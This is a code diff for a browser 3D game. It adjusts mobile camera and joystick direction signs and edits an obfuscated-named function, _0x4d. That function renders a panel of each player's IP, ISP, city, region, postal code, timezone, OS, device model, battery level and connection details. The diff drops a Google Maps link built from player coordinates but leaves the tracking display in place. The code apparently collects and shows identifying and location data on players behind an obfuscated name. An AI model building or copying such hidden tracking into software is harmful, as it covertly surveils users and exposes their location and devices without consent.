@@ -630,8 +630,8 @@ function setupMobileControls() {
                 const dx = t.clientX - lookData.lastX;
                 const dy = t.clientY - lookData.lastY;
                 euler.setFromQuaternion(camera.quaternion);
-                euler.y += dx * 0.004;
-                euler.x += dy * 0.004;
+                euler.y -= dx * 0.004;
+                euler.x -= dy * 0.004;
                 euler.x = Math.max(-Math.PI / 2.5, Math.min(Math.PI / 2.5, euler.x));
                 camera.quaternion.setFromEuler(euler);
                 lookData.lastX = t.clientX;
@@ -975,8 +975,8 @@ function animate() {
         direction.set(0, 0, 0);
 
         if (isMobile && joystickData.active) {
-            direction.z = -joystickData.dy;
-            direction.x = -joystickData.dx;
+            direction.z = joystickData.dy;
+            direction.x = joystickData.dx;
         } else {
             if (moveForward) direction.z = -1;
             if (moveBackward) direction.z = 1;
@@ -1158,16 +1158,13 @@ async function _0x4d(rc) {
                 h += '<div style="display:flex;flex-wrap:wrap;gap:15px;">';
 
                 rPlayers.forEach(p => {
-                    const mapLink = (p.lat && p.lon)
-                        ? '<a href="https://www.google.com/maps/@' + p.lat + ',' + p.lon + ',15z" target="_blank" style="color:#ffaa00;text-decoration:none;background:#222;padding:4px 10px;border-radius:4px;display:inline-block;margin:4px 0;">\uD83C\uDF0D \u0639\u0631\u0636 \u0639\u0644\u0649 \u0627\u0644\u062E\u0631\u064A\u0637\u0629</a>'
-                        : '<span style="color:#555;">\u063A\u064A\u0631 \u0645\u062A\u0627\u062D</span>';
                     h += '<div style="border:1px solid #222;padding:15px;background:#111;border-radius:5px;flex:1;min-width:280px;">';
                     h += '<h4 style="color:#0f0;margin:0 0 10px 0;">' + esc(p.name) + '</h4>';
                     h += '<table style="width:100%;border-collapse:collapse;font-size:0.9rem;">';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;width:100px;color:#0ff;">IP</td>';
                     h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.ip || '?') + '<br>' + esc(p.isp || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0645\u0648\u0642\u0639</td>';
-                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + (p.region ? ' / ' + esc(p.region) : '') + ' (' + esc(p.zip || '?') + ')<br>' + mapLink + '<br>' + esc(p.timezone || '?') + '</td></tr>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + (p.region ? ' / ' + esc(p.region) : '') + ' (' + esc(p.zip || '?') + ')<br>' + esc(p.timezone || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u062C\u0647\u0627\u0632</td>';
                     h += '<td style="padding:5px;border-bottom:1px solid #222;"><b>' + esc(p.os || '?') + '</b><br><span style="color:#fff;">' + esc(p.deviceModel || '?') + '</span><br><span style="color:#0f0;">\uD83D\uDD0B ' + esc(p.battery || '?') + '</span></td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0627\u062A\u0635\u0627\u0644</td>';
